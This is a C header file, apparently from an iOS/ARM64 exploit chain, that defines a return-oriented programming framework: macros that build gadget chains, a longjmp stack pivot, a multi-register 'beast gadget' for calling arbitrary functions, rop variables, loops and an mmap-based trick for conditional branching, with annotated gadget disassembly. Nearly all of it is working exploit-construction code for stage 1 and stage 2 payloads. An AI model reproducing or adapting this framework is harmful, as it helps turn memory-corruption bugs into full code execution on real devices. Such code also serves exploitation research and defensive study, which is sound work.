#include <stdlib.h>
#include <stdio.h> 
#include <string.h>
#include <sys/mman.h>

// this is the file where everything related to roping lives
// the main idea behind it is to create a linked list of rop_gadget structs that can then be turned into a file

#ifndef ROP_H
#define ROP_H
// there are different types so that we know that we might need to add the base address of the rop chain or the base address of the cache etc
enum ropgadget_types {
	STATIC, // static value
	CODEADDR, // code address inside of the cache
	OFFSET, // offset inside of the rop chain
	REL_OFFSET, // realtiv offset inside of the rop chain
	NONE, // default type
	BUF, // this type is basically mainy static objects after each other
	BARRIER, // this is used to split stage 2 into two rop stacks for each of the threads
	ROP_VAR, // variable used in rop
	ROP_LOOP_START, // start of a loop in rop
	ROP_LOOP_END, // end of a loop in rop
	ROP_LOOP_BREAK // break inside of the loop (this will break if x0 is none zero iirc)
};

// structure for comments that show up for debugging the rop stack in the debug version
struct rop_gadget_comment {
	uint64_t line;
	char * comment;
};
// struct to hold each rop gadget
struct rop_gadget {
	uint64_t value;
	int second_val;
	int type;
	struct rop_gadget_comment * comment;
	struct rop_gadget * next;
};
typedef struct rop_gadget rop_gadget_t;

// specific struct for rop values
struct rop_var {
	char * name;
	uint64_t size;
	void * buffer;
	uint64_t stage_addr; 
	struct rop_var * next;
};
typedef struct rop_var rop_var_t;

// This is the first part of rop basically only used in stage 1 

// TODO: explain what all of that does in greater detail
// this sets up the rop framework by mallocing a head and defining a few vars
#define ROP_SETUP(rop_chain_head) \
	rop_gadget_t * curr_gadget = malloc(sizeof(rop_gadget_t)); \
	rop_gadget_t * prev = NULL; \
	if (curr_gadget == NULL) {LOG("malloc w00t");exit(-1);} \
	curr_gadget->next = NULL; \
	curr_gadget->type = NONE; \
	curr_gadget->comment = NULL; \
	(rop_chain_head) = curr_gadget; \
	int ropchain_len = 0; 

// this can be used to add an a new gadget to the list we can then modifiy 
#define ADD_GADGET() \
	ropchain_len++; \
	if (prev != NULL) { \
		prev = curr_gadget; \
		curr_gadget = malloc(sizeof(rop_gadget_t));\
		curr_gadget->next = NULL; \
		curr_gadget->type = NONE; \
		curr_gadget->comment = NULL; \
		prev->next = curr_gadget; \
	}else{ \
		prev = curr_gadget; \
	}

// this will add a comment to the current rop gadget with the line number on none release builds so that we can easily identify where it is in the source file
#ifndef RELEASE 
#define ADD_COMMENT(mycomment) \
	curr_gadget->comment = malloc(sizeof(struct rop_gadget_comment)); \
	curr_gadget->comment->line = __LINE__; \
	curr_gadget->comment->comment = strdup(mycomment);
#else
#define ADD_COMMENT(x)
#endif

// all of the ones below will then use ADD_GADGET now to first add a new gadget to the chain and then modifing it's values

// so this one will insert a barrier and with that pad the rop stack to the specified address
#define ADD_BARRIER(addr) \
	ADD_GADGET(); \
	curr_gadget->type = BARRIER; \
	curr_gadget->value = addr;

// add a loop start for a loop of a specific name
// there was a plan to have inner loops so the name is needed for the break instruction, but I think I never added that functionallity (TODO: should check that :P)
#define ADD_LOOP_START(name) \
	ADD_GADGET(); \
	curr_gadget->value = (uint64_t) strdup(name); \
	curr_gadget->type = ROP_LOOP_START;

// marking the end of a loop
#define ADD_LOOP_END() \
	ADD_GADGET(); \
	curr_gadget->type = ROP_LOOP_END;

// this will break out of the loop if x0 was none zero
// the plan here was to chain these with other gadgets that perform aritmethic on the value in x0 to also get equal to and other stuff but I never did that
#define ADD_LOOP_BREAK_IF_X0_NONZERO(name) \
	ADD_GADGET(); \
	curr_gadget->value = (uint64_t) strdup(name); \
	curr_gadget->type = ROP_LOOP_BREAK;

// adding a gadget that has a codeaddress inside of cache
#define ADD_CODE_GADGET(addr) \
	ADD_GADGET(); \
	curr_gadget->value = (uint64_t)addr; \
	curr_gadget->type = CODEADDR;

// adding sth with a static value
#define ADD_STATIC_GADGET(val) \
	ADD_GADGET(); \
	curr_gadget->value = (uint64_t) val; \
	curr_gadget->type = STATIC;

// adding sth with an offset in the chain
#define ADD_OFFSET_GADGET(val) \
	ADD_GADGET(); \
	curr_gadget->value = val; \
	curr_gadget->type = OFFSET;

// adding a buffer
#define ADD_BUFFER(address,size) \
	ADD_GADGET(); \
	curr_gadget->value = (uint64_t)address; \
	curr_gadget->second_val = size; \
	curr_gadget->type = BUF; 

// adding a rop variable but we use an offset in it
#define ADD_ROP_VAR_GADGET_W_OFFSET(name,offset) \
	ADD_GADGET(); \
	curr_gadget->value = (uint64_t) strdup(name); \
	curr_gadget->second_val = offset; \
	curr_gadget->type = ROP_VAR; 

#define ADD_ROP_VAR_GADGET(name) ADD_ROP_VAR_GADGET_W_OFFSET(name,0)

// relativ offset from this gadget
#define ADD_REL_OFFSET_GADGET(val) \
	ADD_GADGET(); \
	curr_gadget->value = (uint64_t)val; \
	curr_gadget->type = REL_OFFSET; 

/****** FRAMEWORK ****/
// this is the framework I use in stage 2

/*
 This is our main gadget now:
		0x1a0478c70      e40316aa       mov x4, x22
		0x1a0478c74      e50314aa       mov x5, x20
		0x1a0478c78      e60315aa       mov x6, x21
		0x1a0478c7c      e70313aa       mov x7, x19
		0x1a0478c80      e0031aaa       mov x0, x26
		0x1a0478c84      e10319aa       mov x1, x25
		0x1a0478c88      e20318aa       mov x2, x24
		0x1a0478c8c      e30317aa       mov x3, x23
		0x1a0478c90      60033fd6       blr x27                    ;[0]
		0x1a0478c94      fd7b47a9       ldp x29, x30, [sp, 0x70]
		0x1a0478c98      f44f46a9       ldp x20, x19, [sp, 0x60]
		0x1a0478c9c      f65745a9       ldp x22, x21, [sp, 0x50]
		0x1a0478ca0      f85f44a9       ldp x24, x23, [sp, 0x40]
		0x1a0478ca4      fa6743a9       ldp x26, x25, [sp, 0x30]
		0x1a0478ca8      fc6f42a9       ldp x28, x27, [sp, 0x20]
		0x1a0478cac      e923416d       ldp d9, d8, [sp, 0x10]
		0x1a0478cb0      ff030291       add sp, sp, 0x80
		0x1a0478cb4      c0035fd6       ret

longjmp:
	   180a817dc	LDP     X19, X20, [X0,#0]	 // x19 will contain the same address as x9 and we don't really want to change that 0x08 of our stack will be loaded into x20
	   180a817e0	LDP     X21, X22, [X0,#16]	 // x21 = our stack 0x10 and x22 = our stack 0x18
	   180a817e4	LDP     X23, X24, [X0,#32]   // x23 = our stack 0x20 and x24 = our stack 0x28
	   180a817e8	LDP     X25, X26, [X0,#48]   // x25 = our stack 0x30 and x26 = our stack 0x38
	   180a817ec	LDP     X27, X28, [X0,#64]   // x27 = our stack 0x40 and x28 = our stack 0x48
	   180a817f0	LDP     X29, X30, [X0,#80]   // x29 = our stack 0x50 and x30 = our stack 0x58
	   180a817f4	LDP     X29, X2, [X0,#96]    // x29 = our stack 0x60 and x2  = our stack 0x68
	   180a817f8	LDP     D8, D9, [X0, #112]   // we can ignore those registers
	   180a817fc	LDP     D10, D11, [X0, #128] //
	   180a81800	LDP     D12, D13, [X0, #144] //
	   180a81804	LDP     D14, D15, [X0, #160] //
	   180a81808	ADD     X31, X2, #0    	     // we pivot using x2 which is loaded from
	   180a8180c	MOV     X0, X1         	     // x0 will now contain the contents of x1 we can't control atm
	   180a81810	CMP     X0, #0         	     // irrelvant
	   180a81814	B.NE    0x180a8181c
	   180a81818	ADD     X0, X0, #1
	   180a8181c    RET                          // pivoted

str_x0_gadget (from llvm):
            0x198ba668c      601600f9       str x0, [x19, 0x28]
            0x198ba6690      00008052       movz w0, 0
            0x198ba6694      fd7b41a9       ldp x29, x30, [sp, 0x10]
            0x198ba6698      f44fc2a8       ldp x20, x19, [sp], 0x20
            0x198ba669c      c0035fd6   

cbz_x0_gadget (from llvm):
			┌──<  0x00349c54      400000b4       cbz x0, 0x349c5c
			┌───< 0x00349c58      397e1d14       b 0xaa953c
			│└──> 0x00349c5c      c0035fd6       ret 
    
			└──>  0x00aa953c   *  b0a50bf0       adrp x16, 0x17f60000
				  0x00aa9540      109a46f9       ldr x16, [x16, 0xd30]    ; [0xd30:4]=0
				  0x00aa9544      00021fd6       br x16 

add_x0_gadget (from libiconv.2.dylib):
		    0x184f6992c      a002148b       add x0, x21, x20
            0x184f69930      fd7b42a9       ldp x29, x30, [sp, 0x20]
            0x184f69934      f44f41a9       ldp x20, x19, [sp, 0x10]
            0x184f69938      f657c3a8       ldp x22, x21, [sp], 0x30
            0x184f6993c      c0035fd6       ret

*/

// we assume we get here with pc pointing to the top of longjump and x0 pointing to the new buffer (which we will create now)
// we will jump over all of the const data and after that have our stack, pc will point to the instruction after the blr x27 of our super gadget
#define INIT_FRAMEWORK(offsets) \
	int ropchain_len = 0; \
	int rop_var_tmp_nr = 0; \
	int rop_var_arg_num = -1; \
	rop_gadget_t * curr_gadget = malloc(sizeof(rop_gadget_t)); \
	rop_gadget_t * prev = NULL; \
	if (curr_gadget == NULL) {LOG("malloc w00t");exit(-1);} \
	curr_gadget->next = NULL; \
	curr_gadget->type = NONE; \
	curr_gadget->comment = NULL; \
	(offsets)->stage2_ropchain = curr_gadget; \
	rop_var_t * curr_rop_var = NULL; \
	rop_var_t * new_rop_var = malloc(sizeof(rop_var_t)); \
	rop_var_t * rop_var_top = new_rop_var; \
	ADD_GADGET(); /* x19 */ \
	ADD_GADGET(); /* x20 */\
	ADD_GADGET(); /* x21 */\
	ADD_GADGET(); /* x22 */\
	ADD_GADGET(); /* x23 */\
	ADD_GADGET(); /* x24 */\
	ADD_GADGET(); /* x25 */\
	ADD_GADGET(); /* x26 */\
	ADD_GADGET(); /* x27 */\
	ADD_GADGET(); /* x28 */\
	ADD_GADGET(); /* x29 */\
	ADD_CODE_GADGET((offsets)->BEAST_GADGET_LOADER); /* x30 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_STATIC_GADGET(((offsets)->stage2_base+(offsets)->stage2_databuffer_len)); /* x2 */ \
	ADD_GADGET(); /* D8 */\
	ADD_GADGET(); /* D9 */\
	ADD_GADGET(); /* D10 */\
	ADD_GADGET(); /* D11 */\
	ADD_GADGET(); /* D12 */\
	ADD_GADGET(); /* D13 */\
	ADD_GADGET(); /* D14 */\
	ADD_GADGET(); /* D15 */\
	ADD_BUFFER((offsets)->stage2_databuffer,((offsets)->stage2_databuffer_len-22*8)); /* encount for this longjmp buffer here */ \
	SETUP_IF_X0();
	
// assuming we get here with pc pointing to the loader part of our beast gadget
#define CALL_FUNCTION(next_addr,addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
	if (rop_var_arg_num != 0 && rop_var_arg_num != -1) {LOG("WRONG AMOUNT OF ARGS (line:%d)",__LINE__);exit(1);} \
	rop_var_arg_num = -1; \
	ADD_GADGET(); \
	ADD_GADGET(); \
	ADD_GADGET(); /* d9 */ \
	ADD_GADGET(); /* d8 */ \
	ADD_GADGET(); /* x28 */ \
	ADD_CODE_GADGET(addr); /* x27 */ \
	ADD_STATIC_GADGET(arg1); /* x26 */ \
	ADD_STATIC_GADGET(arg2); /* x25 */ \
	ADD_STATIC_GADGET(arg3); /* x24 */ \
	ADD_STATIC_GADGET(arg4); /* x23 */ \
	ADD_STATIC_GADGET(arg5); /* x22 */ \
	ADD_STATIC_GADGET(arg7); /* x21 */ \
	ADD_STATIC_GADGET(arg6); /* x20 */ \
	ADD_STATIC_GADGET(arg8); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET(next_addr); /* x30 */ 

// as you can see the difference here is that we don't slide the address so we can also call static functions
#define CALL_FUNCTION_NO_SLIDE(next_addr,addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
	if (rop_var_arg_num != 0 && rop_var_arg_num != -1) {LOG("WRONG AMOUNT OF ARGS (line:%d)",__LINE__);exit(1);} \
	rop_var_arg_num = -1; \
	ADD_GADGET(); \
	ADD_GADGET(); \
	ADD_GADGET(); /* d9 */ \
	ADD_GADGET(); /* d8 */ \
	ADD_GADGET(); /* x28 */ \
	ADD_STATIC_GADGET(addr); /* x27 */ \
	ADD_STATIC_GADGET(arg1); /* x26 */ \
	ADD_STATIC_GADGET(arg2); /* x25 */ \
	ADD_STATIC_GADGET(arg3); /* x24 */ \
	ADD_STATIC_GADGET(arg4); /* x23 */ \
	ADD_STATIC_GADGET(arg5); /* x22 */ \
	ADD_STATIC_GADGET(arg7); /* x21 */ \
	ADD_STATIC_GADGET(arg6); /* x20 */ \
	ADD_STATIC_GADGET(arg8); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET(next_addr); /* x30 */

// we will chain the BEAST_GADGET after itself all the time so I also defined this macro
#define CALL_FUNC(addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
	CALL_FUNCTION((offsets)->BEAST_GADGET,addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8);

// there is this gadget: str x0, [x19, #0x28]; ldp x29, x30, [sp, #0x10]; ldp x20, x19, [sp], #0x20; ret; 
// we will use this to str x0 somewhere (cause we get x19 control from the gadget above)
// Because we use a second call gadget we will jump back to the gadget abve to load the registers again/for the next func call
// TODO: in theory I think it's also possible to not have it jump back to the loader gadget but jump straight to the gadget above, this would save a bit of space on the rop chain
#define CALL_FUNC_WITH_RET_SAVE(where,addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
	CALL_FUNC(addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8); \
	ADD_GADGET(); \
	ADD_GADGET(); \
	ADD_GADGET(); /* d9 */ \
	ADD_GADGET(); /* d8 */ \
	ADD_GADGET(); /* x28 */ \
	ADD_GADGET(); /* x27 */ \
	ADD_GADGET(); /* x26 */ \
	ADD_GADGET(); /* x25 */ \
	ADD_GADGET(); /* x24 */ \
	ADD_GADGET(); /* x23 */ \
	ADD_GADGET(); /* x22 */ \
	ADD_GADGET(); /* x21 */ \
	ADD_GADGET(); /* x20 */ \
	ADD_STATIC_GADGET((where-(offsets)->str_x0_gadget_offset)); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET((offsets)->str_x0_gadget); /* x30 */  \
	ADD_GADGET(); /* x20 */ \
	ADD_GADGET(); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET((offsets)->BEAST_GADGET_LOADER); // x30 

// this defines a rop variable with a specific size getting initalized with the contents passed via buf (keep in mind that this will only build the chain at the end and because it won't copy the buffer before that you need to keep it's contents constant after the definition/or the last version will be used)
#define DEFINE_ROP_VAR(varname,varsize,buf) \
	if (curr_rop_var != NULL) { \
		new_rop_var = malloc(sizeof(rop_var_t)); \
		if (new_rop_var == NULL) {LOG("malloc");exit(-1);} \
		curr_rop_var->next = new_rop_var; \
	} \
	new_rop_var->name = strdup(varname); \
	new_rop_var->size = varsize; \
	new_rop_var->buffer = (void*)buf;\
	new_rop_var->next = NULL; \
	curr_rop_var = new_rop_var; 

// we will (ab)use memcpy to copy data from the stack into the rop var buffer
#define SET_ROP_VAR_RAW(name,value,offset,size) \
	ADD_COMMENT("set rop var"); \
	ADD_GADGET(); \
	ADD_GADGET(); \
	ADD_GADGET(); /* d9 */ \
	ADD_GADGET(); /* d8 */ \
	ADD_GADGET(); /* x28 */ \
	ADD_CODE_GADGET((offsets)->memcpy); /* x27 */ \
	ADD_ROP_VAR_GADGET_W_OFFSET(name,offset); /* x26 */ \
	ADD_REL_OFFSET_GADGET(16); /* x25 */ \
	ADD_STATIC_GADGET(size); /* x24 */ \
	ADD_STATIC_GADGET(value); /* x23 (the offset is pointing here) */ \
	ADD_GADGET(); /* x22 */ \
	ADD_GADGET(); /* x21 */ \
	ADD_GADGET(); /* x20 */ \
	ADD_GADGET(); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 

// set 64 and 32 bit vars inside of rop var buffers at specific offsets
#define SET_ROP_VAR64_W_OFFSET(name,value,offset) SET_ROP_VAR_RAW(name,value,offset,8)
#define SET_ROP_VAR64(name,value) SET_ROP_VAR64_W_OFFSET(name,value,0)
#define SET_ROP_VAR32_W_OFFSET(name,value,offset) SET_ROP_VAR_RAW(name,value,offset,4)
#define SET_ROP_VAR32(name,value) SET_ROP_VAR32_W_OFFSET(name,value,0)

// this can be used to make one rop var point to the other (basically *((uint64_t*)&name+offset1) = &other_name + offset2
#define SET_ROP_VAR64_TO_VAR_W_OFFSET(name,offset1,other_name,offset2) \
	ADD_COMMENT("set rop var 64 to var with offset"); \
	ADD_GADGET(); \
	ADD_GADGET(); \
	ADD_GADGET(); /* d9 */ \
	ADD_GADGET(); /* d8 */ \
	ADD_GADGET(); /* x28 */ \
	ADD_CODE_GADGET((offsets)->memcpy); /* x27 */ \
	ADD_ROP_VAR_GADGET_W_OFFSET(name,offset1); /* x26 */ \
	ADD_REL_OFFSET_GADGET(16); /* x25 */ \
	ADD_STATIC_GADGET(8); /* x24 */ \
	ADD_ROP_VAR_GADGET_W_OFFSET(other_name,offset2); /* x23 (the offset is pointing here) */ \
	ADD_GADGET(); /* x22 */ \
	ADD_GADGET(); /* x21 */ \
	ADD_GADGET(); /* x20 */ \
	ADD_GADGET(); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 

// this can be used to copy from one rop var to another passing the dest as the first arg with it's offset and then in the second the src and it's offset
#define ROP_VAR_CPY_W_OFFSET(name,offset1,other_name,offset2,size) \
	ADD_COMMENT("copy rop var with offset"); \
	ADD_GADGET(); \
	ADD_GADGET(); \
	ADD_GADGET(); /* d9 */ \
	ADD_GADGET(); /* d8 */ \
	ADD_GADGET(); /* x28 */ \
	ADD_CODE_GADGET((offsets)->memcpy); /* x27 */ \
	ADD_ROP_VAR_GADGET_W_OFFSET(name,offset1); /* x26 */ \
	ADD_ROP_VAR_GADGET_W_OFFSET(other_name,offset2); /* x25 */ \
	ADD_STATIC_GADGET(size); /* x24 */ \
	ADD_GADGET(); /* x23 */ \
	ADD_GADGET(); /* x22 */ \
	ADD_GADGET(); /* x21 */ \
	ADD_GADGET(); /* x20 */ \
	ADD_GADGET(); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 

// just used to copy one rop var into the other
#define ROP_VAR_CPY(name,other_name,size) ROP_VAR_CPY_W_OFFSET(name,0,other_name,0,size)

// optimization to save the return value right into a rop variable
#define CALL_FUNC_RET_SAVE_VAR(name,addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
	CALL_FUNC(addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8); \
	ADD_GADGET(); \
	ADD_GADGET(); \
	ADD_GADGET(); /* d9 */ \
	ADD_GADGET(); /* d8 */ \
	ADD_GADGET(); /* x28 */ \
	ADD_GADGET(); /* x27 */ \
	ADD_GADGET(); /* x26 */ \
	ADD_GADGET(); /* x25 */ \
	ADD_GADGET(); /* x24 */ \
	ADD_GADGET(); /* x23 */ \
	ADD_GADGET(); /* x22 */ \
	ADD_GADGET(); /* x21 */ \
	ADD_GADGET(); /* x20 */ \
	ADD_ROP_VAR_GADGET_W_OFFSET(name, (-(offsets)->str_x0_gadget_offset)); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET((offsets)->str_x0_gadget); /* x30 */  \
	ADD_GADGET(); /* x20 */ \
	ADD_GADGET(); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET((offsets)->BEAST_GADGET_LOADER); // x30 

// TODO: make this faster
// the problem with this being so slow is that it's used in loops and both rop var arg calls will call out to memcpy (see ROP_VAR_ARG_W_OFFSET below for a more detailed explanation on how the MACRO works)
#define ROP_VAR_ADD(result,var1,var2) \
	ADD_COMMENT("add two rop vars"); \
	ROP_VAR_ARG_HOW_MANY(2); \
	ROP_VAR_ARG64(var1,6); \
	ROP_VAR_ARG64(var2,7); \
	ADD_GADGET(); \
	ADD_GADGET(); \
	ADD_GADGET(); /* d9 */ \
	ADD_GADGET(); /* d8 */ \
	ADD_GADGET(); /* x28 */ \
	ADD_GADGET(); /* x27 */ \
	ADD_GADGET(); /* x26 */ \
	ADD_GADGET(); /* x25 */ \
	ADD_GADGET(); /* x24 */ \
	ADD_GADGET(); /* x23 */ \
	ADD_GADGET(); /* x22 */ \
	ADD_GADGET(); /* x21 will get overwritten by the ROP_VAR_ARG64 call above */ \
	ADD_GADGET(); /* x20 will get overwritten by the ROP_VAR_ARG64 call above */ \
	ADD_GADGET(); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET((offsets)->add_x0_gadget); /* x30 */  \
	ADD_GADGET(); /* x22 */ \
	ADD_GADGET(); /* x21 */ \
	ADD_GADGET(); /* x20 */ \
	ADD_ROP_VAR_GADGET_W_OFFSET(result, (-(offsets)->str_x0_gadget_offset)); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET((offsets)->str_x0_gadget); /* x30 */  \
	ADD_GADGET(); /* x20 */ \
	ADD_GADGET(); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET((offsets)->BEAST_GADGET_LOADER); // x30 

#define ROP_VAR_ARG_HOW_MANY(howmany) \
	rop_var_arg_num = howmany;

// this is here to set the arg of a func call to a pointer to our rop var
// it will call memcpy and then copy the address of our gadget over the argument in the next function call (9*8 to get to the next function 7*8 to get to the args and then nr*8 to get to the arg)
// but the 7th arg is acc at the 6th position and vice versa so we have to account for that
// this is super dirty...
// FIXME: there must be a better way to do this...
#define ROP_VAR_ARG_W_OFFSET(name,nr,offset) \
	if (rop_var_arg_num == -1) {LOG("YOU NEED TO USE ROP_VAR_ARG_HOW_MANY BEFORE USING ROP_VAR_ARG_* (line:%d)",__LINE__);exit(1);} \
	rop_var_arg_num--; \
	ADD_COMMENT("rop var arg with offset"); \
	rop_var_tmp_nr = nr; \
	if (rop_var_tmp_nr == 6) {rop_var_tmp_nr = 7;} \
	else if (rop_var_tmp_nr == 7) {rop_var_tmp_nr = 6;} \
	ADD_GADGET(); \
	ADD_GADGET(); \
	ADD_GADGET(); /* d9 */ \
	ADD_GADGET(); /* d8  */ \
	ADD_GADGET(); /* x28 */ \
	ADD_CODE_GADGET((offsets)->memcpy); /* x27 */ \
	ADD_REL_OFFSET_GADGET((8*8+7*8+rop_var_tmp_nr*8+rop_var_arg_num*16*8)); /* x26 */ \
	ADD_REL_OFFSET_GADGET(16); /* x25 */ \
	ADD_STATIC_GADGET(8); /* x24 */ \
	ADD_ROP_VAR_GADGET_W_OFFSET(name,offset); /* x23 (the offset is pointing here) */ \
	ADD_GADGET(); /* x22 */ \
	ADD_GADGET(); /* x21 */ \
	ADD_GADGET(); /* x20 */ \
	ADD_GADGET(); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 

#define ROP_VAR_ARG(name,nr) ROP_VAR_ARG_W_OFFSET(name,nr,0)

// same as above but it doesn't copy the pointer but a uint64_t value
#define ROP_VAR_ARG64_W_OFFSET(name,nr,offset) \
	if (rop_var_arg_num == -1) {LOG("YOU NEED TO USE ROP_VAR_ARG_HOW_MANY BEFORE USING ROP_VAR_ARG_* (line:%d)",__LINE__);exit(1);} \
	rop_var_arg_num--; \
	ADD_COMMENT("rop var arg 64"); \
	rop_var_tmp_nr = nr; \
	if (rop_var_tmp_nr == 6) {rop_var_tmp_nr = 7;} \
	else if (rop_var_tmp_nr == 7) {rop_var_tmp_nr = 6;} \
	ADD_GADGET(); \
	ADD_GADGET(); \
	ADD_GADGET(); /* d9 */ \
	ADD_GADGET(); /* d8 */ \
	ADD_GADGET(); /* x28 */ \
	ADD_CODE_GADGET((offsets)->memcpy); /* x27 */ \
	ADD_REL_OFFSET_GADGET((8*8+7*8+rop_var_tmp_nr*8+rop_var_arg_num*16*8)); /* x26 */ \
	ADD_ROP_VAR_GADGET_W_OFFSET(name,offset); /* x25 */ \
	ADD_STATIC_GADGET(8); /* x24 */ \
	ADD_GADGET(); /* x23 */ \
	ADD_GADGET(); /* x22 */ \
	ADD_GADGET(); /* x21 */ \
	ADD_GADGET(); /* x20 */ \
	ADD_GADGET(); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 

#define ROP_VAR_ARG64(name,nr) ROP_VAR_ARG64_W_OFFSET(name,nr,0);

// this can be used to load the content of a rop variable (first 8 bytes) into the register x0
#define SET_X0_FROM_ROP_VAR(name) \
	ADD_COMMENT("set x0 from rop var"); \
	ADD_GADGET(); \
	ADD_GADGET(); \
	ADD_GADGET(); /* d9 */ \
	ADD_GADGET(); /* d8 */ \
	ADD_GADGET(); /* x28 */ \
	ADD_CODE_GADGET((offsets)->memcpy); /* x27 */ \
	ADD_REL_OFFSET_GADGET((8*8+7*8+1*8)); /* x26 */ \
	ADD_ROP_VAR_GADGET(name); /* x25 */ \
	ADD_STATIC_GADGET(8); /* x24 */ \
	ADD_GADGET(); /* x23 */ \
	ADD_GADGET(); /* x22 */ \
	ADD_GADGET(); /* x21 */ \
	ADD_GADGET(); /* x20 */ \
	ADD_GADGET(); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET((offsets)->BEAST_GADGET); /* x30 */ \
	ADD_GADGET(); \
	ADD_GADGET(); \
	ADD_GADGET(); /* d9 */ \
	ADD_GADGET(); /* d8 */ \
	ADD_GADGET(); /* x28 */ \
	ADD_CODE_GADGET((offsets)->rop_nop); /* x27 */ \
	ADD_GADGET(); /* x26 */ \
	ADD_GADGET(); /* x25 */ \
	ADD_GADGET(); /* x24 */ \
	ADD_GADGET(); /* x23 */ \
	ADD_GADGET(); /* x22 */ \
	ADD_GADGET(); /* x21 */ \
	ADD_GADGET(); /* x20 */ \
	ADD_GADGET(); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 


// we will (mis)use the str_x0_gadget as a regloader to load regs with other values/offset the stack by another value
// this is the setup that's used to misalign the stack, basically the mmap call is here to map the page that will be accessed by the function epilog to do the tailcall and then we copy the str_x0_gadget function pointer over the original one so that it will be called when x0 was 0 causing a stack misalignment (see stage2.m for an implementation on loops)
#define SETUP_IF_X0() \
	ADD_COMMENT("SETUP for cbz x0"); \
	CALL_FUNC((offsets)->mmap,(((offsets)->cbz_x0_x16_load+(offsets)->new_cache_addr-0x180000000) & ~0x3fff),0x4000,PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANON,0,0,0,0); \
	ADD_GADGET(); \
	ADD_GADGET(); \
	ADD_GADGET(); /* d9 */ \
	ADD_GADGET(); /* d8 */ \
	ADD_GADGET(); /* x28 */ \
	ADD_CODE_GADGET((offsets)->memcpy); /* x27 */ \
	ADD_CODE_GADGET((offsets)->cbz_x0_x16_load); /* x26 */ \
	ADD_REL_OFFSET_GADGET(16); /* x25 */ \
	ADD_STATIC_GADGET(8); /* x24 */ \
	ADD_CODE_GADGET((offsets)->str_x0_gadget); /* x23 */ \
	ADD_GADGET(); /* x22 */ \
	ADD_GADGET(); /* x21 */ \
	ADD_GADGET(); /* x20 */ \
	ADD_GADGET(); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 

#endif
